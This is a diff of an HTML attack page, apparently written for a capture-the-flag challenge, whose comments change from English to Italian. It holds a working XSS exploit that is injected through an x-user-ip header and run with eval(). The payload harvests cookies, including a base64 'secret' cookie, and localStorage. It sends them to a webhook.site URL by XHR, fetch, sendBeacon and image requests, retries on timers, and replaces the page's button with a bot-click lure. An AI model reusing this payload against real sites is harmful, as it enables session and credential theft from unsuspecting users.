@@ -7,48 +7,46 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f0f0;
+            background-color: #f5f5f5;
+            margin: 0;
         }
-        .clickme-button {
+        .clickme {
             padding: 20px 40px;
             font-size: 24px;
+            cursor: pointer;
             background-color: #4CAF50;
             color: white;
             border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            z-index: 1000;
         }
     </style>
 </head>
 <body>
-    <button id="clickme-button" class="clickme-button">Click Me!</button>
+    <button class="clickme" id="centerButton">Click Me!</button>
 
     <script>
-        // The XSS payload to be injected via the x-user-ip header
+        // Il payload XSS che viene iniettato nell'header x-user-ip
         const xssPayload = `
         (function() {
-            // Function to decode the base64 encoded values
+            // Funzione per decodificare Base64
             function decodeBase64(str) {
                 try {
                     return atob(str);
                 } catch (e) {
-                    return null;
+                    return "Decodifica fallita: " + e.message;
                 }
             }
             
-            // Function to extract specific cookies
+            // Funzione per estrarre i cookie
             function getCookie(name) {
                 const value = "; " + document.cookie;
                 const parts = value.split("; " + name + "=");
@@ -56,51 +54,42 @@
                 return null;
             }
             
-            // Main function to extract and exfiltrate the flag
-            function leakFlag() {
-                // Create the data object with all possible places the flag might be
+            // Funzione per esfiltrare i dati
+            function exfiltrateData() {
+                // Il cookie 'secret' contiene la FLAG in formato Base64 (username:password)
+                const secretCookie = getCookie("secret");
+                
+                // Raccogli tutti i dati possibili
                 const data = {
-                    // The flag is in the 'secret' cookie (password part of base64 encoded 'username:password')
                     cookies: document.cookie,
-                    secretCookie: getCookie("secret"),
-                    decodedSecret: decodeBase64(getCookie("secret")),
+                    cookiesDecoded: {
+                        secret: secretCookie,
+                        secretDecoded: secretCookie ? decodeBase64(secretCookie) : null
+                    },
                     localStorage: {},
-                    location: location.href,
-                    userAgent: navigator.userAgent,
+                    url: location.href,
                     timestamp: new Date().toISOString()
                 };
                 
-                // Try to extract the flag from the cookie
-                try {
-                    const secretCookie = getCookie("secret");
-                    if (secretCookie) {
-                        const decoded = decodeBase64(secretCookie);
-                        if (decoded && decoded.includes(":")) {
-                            // The format is 'username:flag'
-                            data.extractedFlag = decoded.split(":")[1];
-                        }
-                    }
-                } catch (e) {
-                    data.extractionError = e.toString();
-                }
-                
-                // Collect localStorage data
+                // Raccogli tutti i dati dal localStorage
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
                     data.localStorage[key] = localStorage.getItem(key);
                 }
                 
-                // Multiple exfiltration methods to ensure the data gets out
+                // Invia i dati usando vari metodi per garantire che almeno uno funzioni
                 
-                // Method 1: XHR POST
+                // 1. XHR - Il più affidabile ma potrebbe essere bloccato da CORS
                 try {
                     const xhr = new XMLHttpRequest();
                     xhr.open("POST", "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", true);
                     xhr.setRequestHeader("Content-Type", "application/json");
                     xhr.send(JSON.stringify(data));
-                } catch (e) {}
+                } catch (e) {
+                    console.error("XHR error", e);
+                }
                 
-                // Method 2: Fetch API with no-cors mode
+                // 2. Fetch API con no-cors
                 try {
                     fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
                         method: "POST",
@@ -108,39 +97,45 @@
                         body: JSON.stringify(data),
                         mode: "no-cors"
                     });
-                } catch (e) {}
+                } catch (e) {
+                    console.error("Fetch error", e);
+                }
                 
-                // Method 3: sendBeacon (works even when page is closing)
+                // 3. Navigator beacon (funziona anche quando la pagina si chiude)
                 try {
                     navigator.sendBeacon(
                         "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a",
                         JSON.stringify(data)
                     );
-                } catch (e) {}
+                } catch (e) {
+                    console.error("Beacon error", e);
+                }
                 
-                // Method 4: Image with data in the URL (bypasses CORS)
+                // 4. Image - Un metodo che aggira CORS grazie alla querystring
                 try {
-                    const criticalData = {
-                        flag: data.extractedFlag || null,
-                        secret: data.secretCookie || null,
-                        decoded: data.decodedSecret || null
+                    // Condensiamo i dati più importanti per querystring
+                    const imgData = {
+                        secret: secretCookie,
+                        decoded: secretCookie ? decodeBase64(secretCookie) : null,
+                        isAuth: data.localStorage.isAuthenticated || null,
+                        timestamp: data.timestamp
                     };
                     
                     const img = new Image();
                     img.src = "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?data=" + 
-                              encodeURIComponent(JSON.stringify(criticalData));
+                              encodeURIComponent(JSON.stringify(imgData));
                     document.body.appendChild(img);
-                } catch (e) {}
+                } catch (e) {
+                    console.error("Image error", e);
+                }
                 
-                return "Data exfiltrated";
+                console.log("Exfiltrated data:", data);
             }
             
-            // Initial leak attempt on page load
-            setTimeout(leakFlag, 500);
-            
-            // Create a button at the exact center for the bot to click
+            // Crea un nuovo elemento da cliccare al centro della pagina
+            // Il bot è programmato per cliccare al centro
             const button = document.createElement("button");
-            button.id = "bot-target";
+            button.id = "injectedButton";
             button.textContent = "Click Me!";
             button.style.position = "fixed";
             button.style.top = "50%";
@@ -151,79 +146,74 @@
             button.style.backgroundColor = "#4CAF50";
             button.style.color = "white";
             button.style.border = "none";
-            button.style.borderRadius = "10px";
+            button.style.borderRadius = "8px";
+            button.style.zIndex = "999999";
             button.style.cursor = "pointer";
-            button.style.zIndex = "9999";
-            button.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
             
-            // When the bot clicks this button, leak the flag
+            // Quando il bot clicca, estrai e invia la FLAG
             button.addEventListener("click", function() {
-                leakFlag();
-                
-                // Schedule multiple leak attempts during the 60 second wait period
-                for (let i = 1; i <= 6; i++) {
-                    setTimeout(leakFlag, i * 8000); // Every 8 seconds
+                exfiltrateData();
+                // Programma più tentativi di esfiltrazione durante l'attesa di 60 secondi
+                for (let i = 1; i <= 5; i++) {
+                    setTimeout(exfiltrateData, i * 10000); // Ogni 10 secondi
                 }
             });
             
-            // Remove any existing button and add our injected one
-            const existingButton = document.getElementById("clickme-button");
-            if (existingButton) {
-                existingButton.remove();
-            }
+            // Rimuovi il pulsante esistente e aggiungi il nostro
+            const existingButton = document.getElementById("centerButton");
+            if (existingButton) existingButton.remove();
             document.body.appendChild(button);
             
-            // Fallback - schedule additional leak attempts even if click doesn't work
-            setTimeout(leakFlag, 10000);  // 10 seconds
-            setTimeout(leakFlag, 20000);  // 20 seconds
-            setTimeout(leakFlag, 40000);  // 40 seconds
+            // Inoltre, esegui un tentativo di esfiltrazione immediatamente
+            // nel caso il bot non riesca a cliccare correttamente
+            setTimeout(exfiltrateData, 1000);
+            setTimeout(exfiltrateData, 15000);
+            setTimeout(exfiltrateData, 30000);
         })();`;
         
-        // This runs when the page loads
+        // Funzione che viene eseguita quando la pagina si carica
         window.addEventListener('DOMContentLoaded', function() {
-            // Make the button do something when clicked (for testing locally)
-            document.getElementById('clickme-button').addEventListener('click', function() {
-                console.log('Button clicked');
-            });
-            
-            // Create an invisible iframe to exploit the XSS
+            // Create an iframe to inject our XSS payload
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
-            // When the iframe loads, send the request with our XSS payload
+            // When the iframe loads, send the XSS payload via x-user-ip header
             iframe.onload = function() {
-                // Try XMLHttpRequest first
                 try {
+                    // Try XMLHttpRequest first
                     const req = new XMLHttpRequest();
                     req.open('GET', '/api/track', true);
                     req.setRequestHeader('x-user-ip', xssPayload);
                     
                     req.onload = function() {
                         if (req.status >= 200 && req.status < 400) {
+                            // Execute the response (which should contain our injected payload)
                             try {
                                 eval(req.responseText);
                                 console.log('XSS payload executed via XHR');
                             } catch(e) {
-                                console.error('XHR payload execution failed:', e);
-                                tryFetchMethod();
+                                console.error('Error executing payload via XHR:', e);
+                                useFetchMethod();
                             }
                         } else {
-                            tryFetchMethod();
+                            useFetchMethod();
                         }
                     };
                     
                     req.onerror = function() {
-                        tryFetchMethod();
+                        console.error('XHR request failed, trying fetch');
+                        useFetchMethod();
                     };
                     
                     req.send();
                 } catch(e) {
-                    tryFetchMethod();
+                    console.error('Error with XHR:', e);
+                    useFetchMethod();
                 }
                 
-                // Backup fetch method
-                function tryFetchMethod() {
+                // Backup method using fetch
+                function useFetchMethod() {
                     try {
                         fetch('/api/track', {
                             headers: {
@@ -236,14 +226,14 @@
                                 eval(data);
                                 console.log('XSS payload executed via fetch');
                             } catch(e) {
-                                console.error('Fetch payload execution failed:', e);
+                                console.error('Error executing payload via fetch:', e);
                             }
                         })
                         .catch(error => {
-                            console.error('Fetch request failed:', error);
+                            console.error('Fetch error:', error);
                         });
                     } catch(e) {
-                        console.error('Fetch method error:', e);
+                        console.error('Error with fetch:', e);
                     }
                 }
             };
